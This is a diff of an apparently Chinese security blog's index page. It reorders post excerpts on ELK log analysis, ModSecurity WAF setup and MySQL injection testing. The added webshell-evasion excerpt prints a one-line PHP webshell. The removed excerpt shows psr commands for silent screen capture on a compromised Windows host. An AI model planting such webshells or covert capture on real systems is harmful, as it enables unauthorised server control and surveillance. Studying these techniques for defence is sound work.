@@ -139,6 +139,39 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/10/11/bypasswaf-for-webshell/">
+                全方位构造免杀 webshell 小结[一]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-10-11</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/webshell/">webshell</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>前言:<br>&nbsp;&nbsp;&nbsp;&nbsp;本文几乎涵盖了市面上所有已知的webshell免杀手段,自己也很清楚,有些东西一旦公布出去,基本就活不太久了,但好在技巧是死的,人是活的,基于前人的优秀经验基础上所衍生出来的更加刁钻诡异的思路才是最珍贵的,始终坚信,对抗是持续的,shell也是永远杀不完的…<br><br><br>0x01 首先就是基于各类最常规的命令和代码执行函数的花样变形<code>如,拆分重组,动态执行,以此来躲避静态特征检测</code>,不过像有些高危函数默认就会被运维们禁掉,甚至高版本的php默认已经不让执行系统命令[如,php7],万一再开了安全模式,就更费劲了</p>
+<p>php中一些常见的执行类型函数:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">system()</div><div class="line">exec()</div><div class="line">shell_exec()</div><div class="line">passthru()</div><div class="line">proc_open()</div><div class="line"><span class="string">``</span> 反引号执行系统命令</div><div class="line">...</div></pre></td></tr></table></figure></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;?php $_POST[<span class="string">'fun'</span>]($_REQUEST[<span class="string">'req'</span>]);?&gt;</div></pre></td></tr></table></figure>
+        </div>
+        <a href="/2017/10/11/bypasswaf-for-webshell/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/09/23/cobalt-strike/">
                 cobalt strike 快速上手 [ 一 ]
             </a>
@@ -379,6 +412,39 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/08/01/ELK-LOG/">
+                利用 ELK 深度定制实时入侵日志分析平台初步
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-08-01</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/ELK/">ELK</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 首先,快速安装配置好jdk 1.8,因为ES基于java:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># export LANG=en</span></div><div class="line"><span class="comment"># tar xf jdk-8u131-linux-x64.tar.gz</span></div><div class="line"><span class="comment"># mv jdk1.8.0_131/ /usr/local/jdk</span></div><div class="line"><span class="comment"># ll /usr/local/jdk</span></div><div class="line"><span class="comment"># chown -R root.root /usr/local/jdk/</span></div><div class="line"><span class="comment"># ll /usr/local/jdk</span></div><div class="line"><span class="comment"># vi /etc/profile</span></div><div class="line">  <span class="builtin-name">export</span> <span class="attribute">JAVA_HOME</span>=/usr/local/jdk/</div><div class="line">  <span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="variable">$JAVA_HOME</span>/bin:$JAVA_HOME/jre/bin:$PATH</div><div class="line">  <span class="builtin-name">export</span> <span class="attribute">CLASSPATH</span>=.$CLASSPATH:$JAVA_HOME/lib:$JAVA_HOME/jre/lib:$JAVA_HOME/lib/tools.jar</div><div class="line">  <span class="builtin-name">export</span> <span class="attribute">TOMCAT_HOME</span>=/usr/local/tomcat</div><div class="line"><span class="comment"># source /etc/profile</span></div><div class="line"><span class="comment"># java -version</span></div><div class="line"><span class="comment"># javac</span></div></pre></td></tr></table></figure></p>
+<p>0x02 再来熟悉一些必要的关于elasticsearch的基础概念:<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">索引 -&gt; 文档 -&gt; 分片和副本</div></pre></td></tr></table></figure></p>
+<p>0x03 下载配置 elasticsearch:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> wget https://download.elasticsearch.org/elasticsearch/elasticsearch/elasticsearch-1.7.2.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar -xf elasticsearch-1.7.2.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> mv elasticsearch-1.7.2 /usr/<span class="built_in">local</span>/</span></div><div class="line"><span class="meta">#</span><span class="bash"> ln -s /usr/<span class="built_in">local</span>/elasticsearch-1.7.2/ /usr/<span class="built_in">local</span>/elasticsearch</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/08/01/ELK-LOG/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/08/01/log-find/">
                 入侵取证 [ web日志分析初步 ]
             </a>
@@ -413,39 +479,6 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2017/08/01/ELK-LOG/">
-                利用 ELK 深度定制实时入侵日志分析平台初步
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-08-01</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/ELK/">ELK</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 首先,快速安装配置好jdk 1.8,因为ES基于java:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># export LANG=en</span></div><div class="line"><span class="comment"># tar xf jdk-8u131-linux-x64.tar.gz</span></div><div class="line"><span class="comment"># mv jdk1.8.0_131/ /usr/local/jdk</span></div><div class="line"><span class="comment"># ll /usr/local/jdk</span></div><div class="line"><span class="comment"># chown -R root.root /usr/local/jdk/</span></div><div class="line"><span class="comment"># ll /usr/local/jdk</span></div><div class="line"><span class="comment"># vi /etc/profile</span></div><div class="line">  <span class="builtin-name">export</span> <span class="attribute">JAVA_HOME</span>=/usr/local/jdk/</div><div class="line">  <span class="builtin-name">export</span> <span class="attribute">PATH</span>=<span class="variable">$JAVA_HOME</span>/bin:$JAVA_HOME/jre/bin:$PATH</div><div class="line">  <span class="builtin-name">export</span> <span class="attribute">CLASSPATH</span>=.$CLASSPATH:$JAVA_HOME/lib:$JAVA_HOME/jre/lib:$JAVA_HOME/lib/tools.jar</div><div class="line">  <span class="builtin-name">export</span> <span class="attribute">TOMCAT_HOME</span>=/usr/local/tomcat</div><div class="line"><span class="comment"># source /etc/profile</span></div><div class="line"><span class="comment"># java -version</span></div><div class="line"><span class="comment"># javac</span></div></pre></td></tr></table></figure></p>
-<p>0x02 再来熟悉一些必要的关于elasticsearch的基础概念:<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">索引 -&gt; 文档 -&gt; 分片和副本</div></pre></td></tr></table></figure></p>
-<p>0x03 下载配置 elasticsearch:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> wget https://download.elasticsearch.org/elasticsearch/elasticsearch/elasticsearch-1.7.2.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar -xf elasticsearch-1.7.2.tar.gz</span></div><div class="line"><span class="meta">#</span><span class="bash"> mv elasticsearch-1.7.2 /usr/<span class="built_in">local</span>/</span></div><div class="line"><span class="meta">#</span><span class="bash"> ln -s /usr/<span class="built_in">local</span>/elasticsearch-1.7.2/ /usr/<span class="built_in">local</span>/elasticsearch</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2017/08/01/ELK-LOG/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
             <a href="/2017/07/31/bypasswaf-on-database/">
                 bypasswaf for mysql [数据库层面之特殊字符篇]
             </a>
@@ -468,6 +501,41 @@
             <p><br><br>0x01 先准备好用于测试库表及数据:<br><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; <span class="keyword">create</span> <span class="keyword">database</span> injection;</div><div class="line">mysql&gt; use injection;</div><div class="line">mysql&gt; <span class="keyword">CREATE</span> TABLE <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="symbol">`user`</span>(</div><div class="line">	<span class="symbol">`id`</span> INT UNSIGNED AUTO_INCREMENT,</div><div class="line">	<span class="symbol">`username`</span> VARCHAR(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</div><div class="line">	<span class="symbol">`password`</span> VARCHAR(<span class="number">40</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</div><div class="line">	<span class="symbol">`email`</span> VARCHAR(<span class="number">40</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</div><div class="line">	<span class="keyword">PRIMARY</span> <span class="keyword">KEY</span> ( <span class="symbol">`id`</span> )</div><div class="line">	)ENGINE=InnoDB DEFAULT CHARSET=utf8;</div><div class="line">mysql&gt; <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(username,<span class="keyword">password</span>,email) <span class="keyword">values</span>(<span class="string">'gentoo'</span>,<span class="string">'superman'</span>,<span class="string">'sec@rootkit.org'</span>);</div><div class="line">mysql&gt; <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(username,<span class="keyword">password</span>,email) <span class="keyword">values</span>(<span class="string">'arch'</span>,<span class="string">'welcome'</span>,<span class="string">'lin@hook.org'</span>);</div><div class="line">mysql&gt; <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(username,<span class="keyword">password</span>,email) <span class="keyword">values</span>(<span class="string">'admin'</span>,<span class="string">'loginpass'</span>,<span class="string">'xlion@priv.org'</span>);</div></pre></td></tr></table></figure></p>
         </div>
         <a href="/2017/07/31/bypasswaf-on-database/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2017/07/31/waf-for-modsecurity/">
+                ModSecurity 生产级WAF部署优化 [一]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-07-31</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/ModSecurity/">ModSecurity</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>0x01 用大白话来简单说明 WAF 最基本的工作流程<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">捕获客户端的各种请求 -&gt; 匹配WAF拦截规则 -&gt; 命中规则后的处理动作 -&gt; 将整个拦截过程记录到指定的日志文件中 -&gt; 脚本绘制实时攻击图表</div></pre></td></tr></table></figure></p>
+<p>0x02 关于modsecurity<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">一款老牌的开源 <span class="selector-tag">WAF</span>,相信经常搞渗透的朋友,对市面上经常用的几款<span class="selector-tag">WAF</span>,都早已非常熟悉,废话不多说,咱们直奔主题</div><div class="line">本次,我们只是单单把它部署到可用的状态,关于规则深度定制,绕过以及白名单设置是我们面的事情</div><div class="line">个人非常不建议把<span class="selector-tag">modsecurity</span>和<span class="selector-tag">nginx</span>一起用,实际测试中,问题还非常的多,关于<span class="selector-tag">nginx</span>更推荐用<span class="selector-tag">naxsi</span><span class="selector-attr">[后面再单独说]</span></div><div class="line">至于源码包,可自行去 <span class="selector-tag">modsecurity</span> 的官方站点下载  <span class="selector-tag">www</span><span class="selector-class">.modsecurity</span><span class="selector-class">.org</span></div></pre></td></tr></table></figure></p>
+<p>0x03 首先,先编译安装好基本的LAMP环境 [具体编译安装过程,可自行参考博客相关文章] ,这里暂时就直接用之前编译好的环境来演示<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">httpd</span> 2<span class="selector-class">.4</span><span class="selector-class">.27</span> + <span class="selector-tag">php</span> 5<span class="selector-class">.6</span><span class="selector-class">.31</span> + <span class="selector-tag">mysql</span> 5<span class="selector-class">.5</span><span class="selector-class">.57</span> + <span class="selector-tag">centOS6</span><span class="selector-class">.8_x64</span></div></pre></td></tr></table></figure></p>
+<p>0x04 先停掉apache,因为等会儿要编译modsecurity生成对应的库<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> pkill httpd</span></div></pre></td></tr></table></figure></p>
+<p>0x05 开始编译安装 modsecurity,一如往常,务必先装好一些必要的依赖库,不然中间会有很多的麻烦<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> yum install httpd-devel apr apr-util-devel apr-devel pcre pcre-devel libxml2 libxml2-devel curl-devel zlib zlib-devel openssl openssl-devel -y</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> modsecurity-2.9.2</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./configure --with-apxs=/usr/<span class="built_in">local</span>/httpd/bin/apxs   生成modsecurity的so</span></div><div class="line"><span class="meta">#</span><span class="bash"> make &amp;&amp; make install</span></div></pre></td></tr></table></figure></p>
+        </div>
+        <a href="/2017/07/31/waf-for-modsecurity/" class="read-more">Read More</a>
     
 
 </div>
@@ -546,41 +614,6 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2017/07/31/waf-for-modsecurity/">
-                ModSecurity 生产级WAF部署优化 [一]
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-07-31</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/ModSecurity/">ModSecurity</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 用大白话来简单说明 WAF 最基本的工作流程<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">捕获客户端的各种请求 -&gt; 匹配WAF拦截规则 -&gt; 命中规则后的处理动作 -&gt; 将整个拦截过程记录到指定的日志文件中 -&gt; 脚本绘制实时攻击图表</div></pre></td></tr></table></figure></p>
-<p>0x02 关于modsecurity<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">一款老牌的开源 <span class="selector-tag">WAF</span>,相信经常搞渗透的朋友,对市面上经常用的几款<span class="selector-tag">WAF</span>,都早已非常熟悉,废话不多说,咱们直奔主题</div><div class="line">本次,我们只是单单把它部署到可用的状态,关于规则深度定制,绕过以及白名单设置是我们面的事情</div><div class="line">个人非常不建议把<span class="selector-tag">modsecurity</span>和<span class="selector-tag">nginx</span>一起用,实际测试中,问题还非常的多,关于<span class="selector-tag">nginx</span>更推荐用<span class="selector-tag">naxsi</span><span class="selector-attr">[后面再单独说]</span></div><div class="line">至于源码包,可自行去 <span class="selector-tag">modsecurity</span> 的官方站点下载  <span class="selector-tag">www</span><span class="selector-class">.modsecurity</span><span class="selector-class">.org</span></div></pre></td></tr></table></figure></p>
-<p>0x03 首先,先编译安装好基本的LAMP环境 [具体编译安装过程,可自行参考博客相关文章] ,这里暂时就直接用之前编译好的环境来演示<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">httpd</span> 2<span class="selector-class">.4</span><span class="selector-class">.27</span> + <span class="selector-tag">php</span> 5<span class="selector-class">.6</span><span class="selector-class">.31</span> + <span class="selector-tag">mysql</span> 5<span class="selector-class">.5</span><span class="selector-class">.57</span> + <span class="selector-tag">centOS6</span><span class="selector-class">.8_x64</span></div></pre></td></tr></table></figure></p>
-<p>0x04 先停掉apache,因为等会儿要编译modsecurity生成对应的库<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> pkill httpd</span></div></pre></td></tr></table></figure></p>
-<p>0x05 开始编译安装 modsecurity,一如往常,务必先装好一些必要的依赖库,不然中间会有很多的麻烦<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> yum install httpd-devel apr apr-util-devel apr-devel pcre pcre-devel libxml2 libxml2-devel curl-devel zlib zlib-devel openssl openssl-devel -y</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> modsecurity-2.9.2</span></div><div class="line"><span class="meta">#</span><span class="bash"> ./configure --with-apxs=/usr/<span class="built_in">local</span>/httpd/bin/apxs   生成modsecurity的so</span></div><div class="line"><span class="meta">#</span><span class="bash"> make &amp;&amp; make install</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2017/07/31/waf-for-modsecurity/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
             <a href="/2017/07/27/nginx-lbd/">
                 基于 nginx 的负载均衡实现初步
             </a>
@@ -607,39 +640,6 @@
 <p>0x03 在 nginx 中可用来实现负载均衡的模块:<br><figure class="highlight axapta"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">upstream   模块 定义好后端节点及所使用调度算法,大致工作过程是这样的,它会先读取upstream中的配置,然后通过<span class="keyword">server</span>标签中的proxy_pass来进行实际的调用</div><div class="line">http_proxy 模块	主要负责实际的转发行为</div></pre></td></tr></table></figure></p>
         </div>
         <a href="/2017/07/27/nginx-lbd/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/07/24/PSR-screen/">
-                利用win自带的 PSR 实现免杀截屏
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-07-24</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/PSR/">PSR</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 PSR 即win自带的”问题步骤记录器”,也就是说它只会捕捉活动窗口,并不是我们想象的各种远控中的那种截屏功能,win + R 输入 “psr” 即可开启<br><img src="/img/win_screen_self.png" alt=""><br></p>
-<p>0x02 当然,实际渗透中,肯定是不能让对方有任何察觉的,所以图形界面的不要,悄悄的干活,我们可以直接在管理员权限的cmdshell下搞,其实,你完全也可以在PS的shell下操作,至于这个shell怎么搞到,随你,注意,虽然是在命令行中,进程列表中还是会被发现,不过,如果你自己会hook,也是可以让它消失的<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">C:\&gt;psr <span class="string">/start</span> <span class="string">/gui</span> 0 <span class="string">/output</span> <span class="string">"d:\capturescreen.zip"</span></div><div class="line">C:\&gt;psr <span class="string">/stop</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/win_screen_self_start.png" alt=""><br><br>
-        </div>
-        <a href="/2017/07/24/PSR-screen/" class="read-more">Read More</a>
     
 
 </div>
